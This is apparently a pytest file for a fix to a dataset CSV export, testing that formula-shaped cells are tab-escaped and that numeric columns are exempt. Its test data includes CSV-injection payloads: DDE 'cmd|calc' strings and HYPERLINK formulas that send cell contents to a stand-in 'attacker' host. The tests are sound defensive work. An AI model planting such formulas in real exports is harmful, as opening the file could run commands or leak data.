"""fix(#1778): the dataset CSV export needs the hardening its siblings have.

ogr2ogr writes every attribute value verbatim and the writer side validates
only the column NAME, so an editor on a public dataset can store a property
beginning with =, +, - or @ and any anonymous visitor who downloads the CSV
distribution the DCAT record advertises executes it on open. Cross-privilege
sink: the writer needs edit rights on one dataset, the victim needs none.

Two sibling CSV writers (the audit-log export and the admin user export) have
carried the escape for a long time. All three now share one rule.
"""

from __future__ import annotations

import asyncio
import csv
import inspect
import time
from pathlib import Path

import pytest

from app.core.csv_safety import escape_csv_formula, numeric_column_names
from app.processing.export.ogr import (
    ExportError,
    _harden_csv_formulas,
    run_ogr2ogr_export,
)


def _far_deadline() -> float:
    """A budget no test pass can exhaust."""
    return time.monotonic() + 3600


@pytest.mark.parametrize(
    "value",
    [
        "=SUM(1,1)",
        "+1-cmd|'/c calc'!A0",
        "-2+3+cmd|' /C calc'!A0",
        '@HYPERLINK("http://attacker/","click")',
        '=HYPERLINK(CONCAT("http://attacker/?",A1),"x")',
        "-",
        "+",
        "-1.2.3",
        "-12abc",
        "+1e",
    ],
)
def test_formula_shaped_cells_are_escaped(value: str) -> None:
    assert escape_csv_formula(value) == "\t" + value


@pytest.mark.parametrize(
    "value",
    ["-12", "+12", "-0.5", "+.5", "-1.5e-3", "+2E10", "-0"],
)
def test_the_default_escapes_numbers_too(value: str) -> None:
    """fix(#1778 codex r2): strict is the default, and the audit and admin
    exports keep it. A username of `+123` or an account id of `-001` is a
    string that happens to look like a number, and a security log should not
    trade its protection for right-alignment."""
    assert escape_csv_formula(value) == "\t" + value


@pytest.mark.parametrize(
    "value",
    ["-12", "+12", "-0.5", "+.5", "-1.5e-3", "+2E10", "-0"],
)
def test_a_numeric_column_keeps_its_numbers_bare(value: str) -> None:
    """A number is not a formula, and a data export is full of negatives.

    Tab-prefixing them would turn every negative measurement in an attribute
    table into text, for the spreadsheet and for pandas and QGIS alike.
    """
    assert escape_csv_formula(value, allow_numeric=True) == value


@pytest.mark.parametrize("value", ["-12+A1", "-", "+", "-1.2.3", "=1", "@x"])
def test_a_numeric_column_still_escapes_what_is_not_a_number(value: str) -> None:
    assert escape_csv_formula(value, allow_numeric=True) == "\t" + value


def test_numeric_column_names_reads_the_declared_type_not_the_values():
    """The exemption is placed by column type. `get_column_info` stores
    information_schema's data_type verbatim."""
    column_info = [
        {"name": "elevation", "type": "double precision"},
        {"name": "population", "type": "integer"},
        {"name": "count_big", "type": "bigint"},
        {"name": "ratio", "type": "numeric"},
        {"name": "name", "type": "text"},
        {"name": "code", "type": "character varying"},
        {"name": "seen_at", "type": "timestamp without time zone"},
        {"name": "shape", "type": "USER-DEFINED"},
        {"name": None, "type": "integer"},
        "not-a-mapping",
    ]
    assert numeric_column_names(column_info) == frozenset(
        {"elevation", "population", "count_big", "ratio"}
    )
    assert numeric_column_names(None) == frozenset()
    assert numeric_column_names([]) == frozenset()


@pytest.mark.parametrize(
    "value", ["", "name", "POINT(-1 2)", "2026-09-02", "a=b", "12-14"]
)
def test_ordinary_cells_are_untouched(value: str) -> None:
    assert escape_csv_formula(value) == value


def test_hardening_rewrites_a_csv_in_place(tmp_path: Path) -> None:
    target = tmp_path / "export.csv"
    target.write_text(
        "WKT,name,elevation,note\n"
        '"POINT (-1 2)",=SUM(1;1),-12,"quoted, comma"\n'
        '"POINT (3 4)",ordinary,+0.5,"@evil"\n',
        encoding="utf-8",
    )

    _harden_csv_formulas(str(target), _far_deadline(), frozenset({"elevation"}))

    with open(target, newline="", encoding="utf-8") as fh:
        rows = list(csv.reader(fh))

    assert rows[0] == ["WKT", "name", "elevation", "note"]
    assert rows[1] == ["POINT (-1 2)", "\t=SUM(1;1)", "-12", "quoted, comma"]
    assert rows[2] == ["POINT (3 4)", "ordinary", "+0.5", "\t@evil"]
    # No leftover intermediate file.
    assert not (tmp_path / "export.csv.hardened").exists()


def test_the_exemption_follows_the_column_not_the_value(tmp_path: Path) -> None:
    """fix(#1778 codex r2): the same characters, two columns, two answers."""
    target = tmp_path / "typed.csv"
    target.write_text(
        "elevation,label\n-1,-1\n+2.5,+2.5\n-12+A1,-12+A1\n",
        encoding="utf-8",
    )

    _harden_csv_formulas(str(target), _far_deadline(), frozenset({"elevation"}))

    with open(target, newline="", encoding="utf-8") as fh:
        rows = list(csv.reader(fh))

    assert rows[1] == ["-1", "\t-1"], "a numeric column keeps -1 bare"
    assert rows[2] == ["+2.5", "\t+2.5"]
    assert rows[3] == ["\t-12+A1", "\t-12+A1"], "not a number, so not exempt"


def test_no_declared_numeric_columns_escapes_everything(tmp_path: Path) -> None:
    """An export whose dataset has no column_info fails toward escaping."""
    target = tmp_path / "untyped.csv"
    target.write_text("elevation,label\n-1,-1\n", encoding="utf-8")

    _harden_csv_formulas(str(target), _far_deadline(), frozenset())

    with open(target, newline="", encoding="utf-8") as fh:
        rows = list(csv.reader(fh))
    assert rows[1] == ["\t-1", "\t-1"]


def test_hardening_preserves_the_line_ending_gdal_chose(tmp_path: Path) -> None:
    crlf = tmp_path / "crlf.csv"
    crlf.write_bytes(b"a,b\r\n=1,2\r\n")
    _harden_csv_formulas(str(crlf), _far_deadline())
    assert b"\r\n" in crlf.read_bytes()

    lf = tmp_path / "lf.csv"
    lf.write_bytes(b"a,b\n=1,2\n")
    _harden_csv_formulas(str(lf), _far_deadline())
    assert b"\r\n" not in lf.read_bytes()


def test_hardening_survives_a_wkt_cell_past_the_csv_default_limit(
    tmp_path: Path,
) -> None:
    """A detailed polygon's WKT passes csv's 128 KiB default field limit."""
    huge = "POINT (" + "0" * 200_000 + " 1)"
    target = tmp_path / "huge.csv"
    with open(target, "w", newline="", encoding="utf-8") as fh:
        writer = csv.writer(fh)
        writer.writerow(["WKT", "note"])
        writer.writerow([huge, "=SUM(1,1)"])

    _harden_csv_formulas(str(target), _far_deadline(), frozenset())

    with open(target, newline="", encoding="utf-8") as fh:
        rows = list(csv.reader(fh))
    assert rows[1][0] == huge
    assert rows[1][1] == "\t=SUM(1,1)"


def test_the_export_runs_the_pass_only_for_csv_and_only_on_success() -> None:
    src = inspect.getsource(run_ogr2ogr_export)
    assert "_harden_csv_formulas," in src
    hardening_at = src.index("_harden_csv_formulas,")
    failure_raise_at = src.index("ogr2ogr export failed")
    assert failure_raise_at < hardening_at, "a failed run must not be post-processed"


def test_the_export_runs_the_pass_off_the_event_loop_and_under_the_deadline() -> None:
    """fix(#1778 codex r1): inline, this stalled every concurrent request."""
    src = inspect.getsource(run_ogr2ogr_export)
    assert "run_in_thread_draining(" in src, (
        "the pass must go through the draining thread helper its sibling "
        "post-processing steps use"
    )
    assert (
        "export_subprocess_timeout_seconds(deadline)"
        in src.split("_harden_csv_formulas,")[1]
    ), "the pass must be given the request's remaining budget"


def test_all_three_csv_writers_share_one_rule() -> None:
    """The defect was three writers, two private copies and one omission."""
    from app.modules.admin import router as admin_router
    from app.modules.audit import router as audit_router

    assert audit_router._safe_csv_cell is escape_csv_formula
    assert admin_router.escape_csv_formula is escape_csv_formula


def test_the_admin_and_audit_exports_stay_strict() -> None:
    """fix(#1778 codex r2): neither may pass allow_numeric.

    They call the shared helper positionally, so the default governs; this
    fails if someone opts either of them into the dataset export's exemption.
    """
    from app.modules.admin import router as admin_router
    from app.modules.audit import router as audit_router

    for module in (admin_router, audit_router):
        assert "allow_numeric" not in inspect.getsource(module), (
            f"{module.__name__} must keep escaping every leading sign"
        )

    # The property, not just the absence: a username shaped like a number.
    assert escape_csv_formula("+123") == "\t+123"
    assert escape_csv_formula("-001") == "\t-001"


@pytest.mark.anyio
async def test_a_large_pass_does_not_block_a_concurrent_request(tmp_path: Path) -> None:
    """fix(#1778 codex r1): the loop stays responsive while the pass runs.

    The pass is driven the way `run_ogr2ogr_export` drives it. A cooperating
    task that only needs the loop to turn must complete while the rewrite is
    still going; run inline on the loop it could not, because a blocking
    read-and-rewrite yields to nothing until it is done.
    """
    from app.core.async_io import run_in_thread_draining

    target = tmp_path / "big.csv"
    with open(target, "w", newline="", encoding="utf-8") as fh:
        writer = csv.writer(fh)
        writer.writerow(["name", "value", "note"])
        for i in range(200_000):
            writer.writerow([f"row-{i}", f"-{i}", "=SUM(1,1)"])

    loop_turns = 0

    async def keep_turning() -> None:
        nonlocal loop_turns
        while True:
            await asyncio.sleep(0)
            loop_turns += 1

    ticker = asyncio.create_task(keep_turning())
    try:
        await run_in_thread_draining(
            _harden_csv_formulas, str(target), _far_deadline(), frozenset({"value"})
        )
    finally:
        ticker.cancel()
        await asyncio.gather(ticker, return_exceptions=True)

    assert loop_turns > 0, "the event loop never turned while the pass ran"

    with open(target, newline="", encoding="utf-8") as fh:
        rows = list(csv.reader(fh))
    assert rows[1] == ["row-0", "-0", "\t=SUM(1,1)"]


def test_an_expired_deadline_fails_the_export_instead_of_finishing_late(
    tmp_path: Path,
) -> None:
    """fix(#1778 codex r1): the budget the subprocess had now covers the pass."""
    target = tmp_path / "late.csv"
    original = "a,b\n=1,2\n=3,4\n"
    target.write_text(original, encoding="utf-8")

    with pytest.raises(ExportError, match="request budget"):
        _harden_csv_formulas(str(target), time.monotonic() - 1, frozenset())

    # The artifact is untouched and no half-rewritten sibling is left behind.
    assert target.read_text(encoding="utf-8") == original
    assert not (tmp_path / "late.csv.hardened").exists()
